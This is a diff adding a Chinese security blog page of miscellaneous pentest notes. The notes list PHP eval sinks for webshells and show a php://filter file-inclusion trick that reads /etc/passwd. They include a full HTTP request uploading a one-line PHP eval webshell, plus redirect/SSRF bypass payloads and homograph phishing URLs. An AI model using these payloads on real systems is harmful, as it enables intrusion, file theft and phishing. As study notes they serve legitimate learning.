@@ -1,0 +1,792 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="Vorder">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Vorder">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>琐碎知识 · Vorder&#39;s blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/favicons.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Vorder&#39;s blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">琐碎知识</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>Vorder's blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:45vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            琐碎知识
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "知识积累">知识积累</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">1.1k</span>阅读时长: <span class="post-count reading-time">4 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/11/06</span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h1><h2 id="代码执行方法"><a href="#代码执行方法" class="headerlink" title="代码执行方法"></a>代码执行方法</h2><blockquote>
+<p><a href="https://www.leavesongs.com/PENETRATION/unobfuscated-phpjiami.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/unobfuscated-phpjiami.html</a><br><a href="http://blog.evalbug.com/2017/09/21/phpdecode_01/" target="_blank" rel="noopener">http://blog.evalbug.com/2017/09/21/phpdecode_01/</a></p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span></span><br><span class="line">preg_replace 函数中的 /e 修饰符 create_function</span><br><span class="line">assert</span><br><span class="line">call_user_func</span><br><span class="line">call_user_func_array</span><br><span class="line">usort</span><br><span class="line">uksort</span><br><span class="line">array_map</span><br><span class="line">array_walk</span><br><span class="line">array_filter</span><br><span class="line">$a($b) <span class="comment">// 动态组装代码执行</span></span><br><span class="line">unserialize <span class="comment">//反序列化导致代码执行</span></span><br></pre></td></tr></table></figure>
+<h2 id="eval-hook检测"><a href="#eval-hook检测" class="headerlink" title="eval hook检测"></a>eval hook检测</h2><p>evalhook下载:<a href="http://php-security.org/downloads/evalhook-0.1.tar.gz" target="_blank" rel="noopener">download</a><br>配置指南：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">执行phpize（是一个shell脚本，编译PHP扩展的工具，主要是根据系统信息生成对应的configure文件,在evalhook目录下执行）</span><br><span class="line"></span><br><span class="line">./configure --with-php-config=/usr/local/php/bin/php-config(先查看自己php-config的目录)</span><br><span class="line"></span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">然后在php.int添加xx.so扩展（php -i | grep &apos;php.ini&apos;寻找）</span><br><span class="line"></span><br><span class="line">最后修改php.ini配置extension=xx.so</span><br><span class="line"></span><br><span class="line">使用方式：php -d extension=xx.so xx.php</span><br></pre></td></tr></table></figure></p>
+<p>大批量解密推荐virink师傅的：<a href="https://github.com/virink/phpext_phpjiami_decode" target="_blank" rel="noopener">phpext_phpjiami_decode</a></p>
+<blockquote>
+<p><a href="http://php-security.org/2010/05/13/article-decoding-a-user-space-encoded-php-script/index.html" target="_blank" rel="noopener">http://php-security.org/2010/05/13/article-decoding-a-user-space-encoded-php-script/index.html</a></p>
+</blockquote>
+<hr>
+<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">include.php?file=php://filter/string.strip_tags/resource=/etc/passwd</span><br><span class="line"><span class="comment">#包含自身include.php?file=php://filter/string.strip_tags/resource=include.php引起php7崩溃</span></span><br></pre></td></tr></table></figure>
+<p>奔溃被保存在<code>/tmp/phpXXXXXX</code>(XXXXXX是数字+字母的6位数)<br>使用burpsuite上传<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST /bestphp/index.php?function=extract&amp;file=php://filter/string.strip_tags/resource=function.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 232</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: null</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">DNT: 1</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryeScXqSzdW2v22xyk</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span><br><span class="line">Cookie: PHPSESSID=vole2qfdpp1mb0ftiavjokte96</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryeScXqSzdW2v22xyk</span><br><span class="line">Content-Disposition: form-data; name=&quot;fileUpload&quot;; filename=&quot;test.jpg&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php echo &quot;flagflag&quot;;@eval($_POST[123]); ?&gt;</span><br><span class="line">------WebKitFormBoundaryeScXqSzdW2v22xyk--</span><br></pre></td></tr></table></figure></p>
+<p>使用burpsuite爆破,勾选关键词<code>flag</code>检测<br><code>http://localhost:80/bestphp/index.php?function=extract&amp;file=/tmp/phpxxxxxx</code></p>
+<blockquote>
+<p>来自 <a href="https://www.jianshu.com/p/7d63eca80686" target="_blank" rel="noopener">https://www.jianshu.com/p/7d63eca80686</a></p>
+</blockquote>
+<hr>
+<h1 id="重定向跳转"><a href="#重定向跳转" class="headerlink" title="重定向跳转"></a>重定向跳转</h1><h2 id="url语法结构"><a href="#url语法结构" class="headerlink" title="url语法结构"></a>url语法结构</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">URI         = scheme &quot;:&quot; hier-part [ &quot;?&quot; query ] [ &quot;#&quot; fragment ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> foo://example.com:8042/over/there?name=ferret#nose</span><br><span class="line"> \_/   \______________/\_________/ \_________/ \__/</span><br><span class="line">  |           |            |            |        |</span><br><span class="line">scheme     authority       path        query   fragment</span><br><span class="line">  |   _____________________|__</span><br><span class="line"> / \ /                        \</span><br><span class="line"> urn:example:animal:ferret:nose</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>具体看官网：<a href="https://tools.ietf.org/html/rfc3986#section-3" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc3986#section-3</a></p>
+</blockquote>
+<h2 id="误导向url跳转"><a href="#误导向url跳转" class="headerlink" title="误导向url跳转"></a>误导向url跳转</h2><p>用户可能认为访问的是google官网,实则访问baidu  例如:<br><code>http://google.com@baidu.com/</code><br><code>//0x7050f849:?.google.com</code></p>
+<h3 id="1-混淆"><a href="#1-混淆" class="headerlink" title="1.混淆"></a>1.混淆</h3><p>变形为<strong>10/16/2进制的ip</strong>    例如:<code>http://google.com@0x7050F849/</code><br>将目标网址<strong>url编码</strong>       例如:<code>http://google.com@%62%61%69%64%75%2e%63%6f%6d</code></p>
+<h3 id="2-其他操作"><a href="#2-其他操作" class="headerlink" title="2.其他操作"></a>2.其他操作</h3><p>针对ssrf和重定向绕过payload<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">//baidu.com</span><br><span class="line">///www.baidu.com//..</span><br><span class="line">.baidu.com</span><br><span class="line">http://baidu.com;google.com/</span><br><span class="line">0://baidu.com:80,google.com:80/</span><br><span class="line">http://baidu<span class="variable">$google</span>.com <span class="comment">#对于bash执行的ssrf来说相当于-&gt;0://baidu&lt;empty&gt;.com</span></span><br></pre></td></tr></table></figure></p>
+<p>其中<code>//xx.com/</code>出现在django漏洞中-&gt;cve-2018-14574<br><code>xx@xx</code>则在官方<a href="https://tools.ietf.org/html/rfc3986#section-7.6" target="_blank" rel="noopener">rfc3986</a>有讲述到</p>
+<h3 id="3-unicode不可见字符钓鱼"><a href="#3-unicode不可见字符钓鱼" class="headerlink" title="3.unicode不可见字符钓鱼"></a>3.unicode不可见字符钓鱼</h3><p>原本思考使用<code>@</code><a href="https://zh.wikipedia.org/wiki/ASCII" target="_blank" rel="noopener">wiki_ascii</a>的unicode可能达到跳转效果:<br>但当firefox下输入<code>google.com␀.com</code> 时<br>发现跳转到<code>http://google.xn--com-zx3a.com</code>这个域名<br>缩短域名<code>www.google␀.com</code>，跳转至<code>http://www.xn--google-165c.com</code></p>
+<p>又想到反正<code>␀</code>为unicode,为何不直接寻找相似unicode去伪造网站<br><code>https://www.bаidu.com</code> 其中<code>а</code>为U+0430可以达到以假乱真的效果<code>但是qq上无法正确显示网址,而且firefox,chrome有针对其unicode进行转义,上述的xn--com-zx3a.com就是转换后的网址</code></p>
+<blockquote>
+<p>unicode大全:<a href="https://unicode-table.com/cn/" target="_blank" rel="noopener">https://unicode-table.com/cn/</a></p>
+</blockquote>
+<h3 id="4-针对unicode大小写转换后的攻击"><a href="#4-针对unicode大小写转换后的攻击" class="headerlink" title="4.针对unicode大小写转换后的攻击"></a>4.针对unicode大小写转换后的攻击</h3><p>当一个网站运行unicode字符作为用户名，他使用一个python库来判断用户名是否幂等</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> twisted.words.protocols.jabber.xmpp_stringprep <span class="keyword">import</span> nodeprep</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">canonical_username</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> nodeprep.prepare(name)</span><br><span class="line">canonical_username(<span class="string">u'\u1d2e\u1d35\u1d33\u1d2e\u1d35\u1d3f\u1d30'</span>)</span><br></pre></td></tr></table></figure>
+<p>这个函数会把大写转换为小写，把类似的unicode字符做一个与chrome的地址栏里相似的转换，举个例子<br>BIG会被转换为big, ƁƗƓ会被转换为ɓɨɠ<br>他们对用户名是否重复的判断是执行一次这个函数然后进行比对 ，例如AAA会被变为aaa则和之前已经注册过的aaa重复 ，但是这里出现了一个错误，注册一个ᴬᴬᴬ，经过函数处理后变成了AAA，因为与aaa不同所以注册成功，而在用户点击重置密码的连接的时候，这个函数再次被执行了一次，AAA变成了aaa，导致用户aaa的密码被越权修改</p>
+<blockquote>
+<p>来自:<a href="http://blog.lnyas.xyz/?p=1411" target="_blank" rel="noopener">http://blog.lnyas.xyz/?p=1411</a></p>
+</blockquote>
+<h2 id="URL-Scheme-Attack"><a href="#URL-Scheme-Attack" class="headerlink" title="URL Scheme Attack"></a>URL Scheme Attack</h2><blockquote>
+<p><a href="https://xz.aliyun.com/t/3233" target="_blank" rel="noopener">https://xz.aliyun.com/t/3233</a></p>
+</blockquote>
+<h1 id="mysql错误型注入"><a href="#mysql错误型注入" class="headerlink" title="mysql错误型注入"></a>mysql错误型注入</h1><p><strong> updatexml </strong> 和 <strong> extractvalue </strong> 详解</p>
+<blockquote>
+<p><a href="http://blkstone.github.io/2017/11/09/updatexml-sqli/" target="_blank" rel="noopener">http://blkstone.github.io/2017/11/09/updatexml-sqli/</a></p>
+</blockquote>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://Vorders.me">Vorder</a>
+            <p>原文链接：<a href="http://Vorders.me/2018/11/06/琐碎知识/">http://Vorders.me/2018/11/06/琐碎知识/</a>
+            <p>发表日期：<a href="http://Vorders.me/2018/11/06/琐碎知识/">November 6th 2018, 5:20:09 pm</a>
+            <p>更新日期：<a href="http://Vorders.me/2018/11/06/琐碎知识/">March 4th 2019, 2:04:32 pm</a>
+            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2018/11/15/绕过云waf找真实ip/" title= "绕过cdn找真实ip">
+                    <div class="nextTitle">绕过cdn找真实ip</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2018/10/16/vul♂hub学习(二)/" title= "vul♂hub学习(二)">
+                    <div class="prevTitle">vul♂hub学习(二)</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+    
+        
+            
+                <a href="//github.com/IVorder" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+            
+                <span class="iconfont-archer qq" title=qq>
+                  
+                  <img class="profile-qr" src="/assets/qq.jpg" />
+                </span>
+            
+        
+    
+        
+            
+                <a href="//t.me/@Vorders" class="iconfont-archer telegram" target="_blank" title=telegram></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:45vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#webshell"><span class="toc-number">1.</span> <span class="toc-text">webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#代码执行方法"><span class="toc-number">1.1.</span> <span class="toc-text">代码执行方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#eval-hook检测"><span class="toc-number">1.2.</span> <span class="toc-text">eval hook检测</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#文件包含"><span class="toc-number">2.</span> <span class="toc-text">文件包含</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#重定向跳转"><span class="toc-number">3.</span> <span class="toc-text">重定向跳转</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#url语法结构"><span class="toc-number">3.1.</span> <span class="toc-text">url语法结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#误导向url跳转"><span class="toc-number">3.2.</span> <span class="toc-text">误导向url跳转</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-混淆"><span class="toc-number">3.2.1.</span> <span class="toc-text">1.混淆</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-其他操作"><span class="toc-number">3.2.2.</span> <span class="toc-text">2.其他操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-unicode不可见字符钓鱼"><span class="toc-number">3.2.3.</span> <span class="toc-text">3.unicode不可见字符钓鱼</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-针对unicode大小写转换后的攻击"><span class="toc-number">3.2.4.</span> <span class="toc-text">4.针对unicode大小写转换后的攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#URL-Scheme-Attack"><span class="toc-number">3.3.</span> <span class="toc-text">URL Scheme Attack</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#mysql错误型注入"><span class="toc-number">4.</span> <span class="toc-text">mysql错误型注入</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 6
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/05</span><a class="archive-post-title" href= "/2019/03/05/semcms-vulnerablity-before-php-v3-7/" >semcms vulnerablity before foregin trade php v3.7</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/27</span><a class="archive-post-title" href= "/2018/12/27/知识索引/" >知识索引</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/19</span><a class="archive-post-title" href= "/2018/12/19/初入elk/" >初入ELK</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
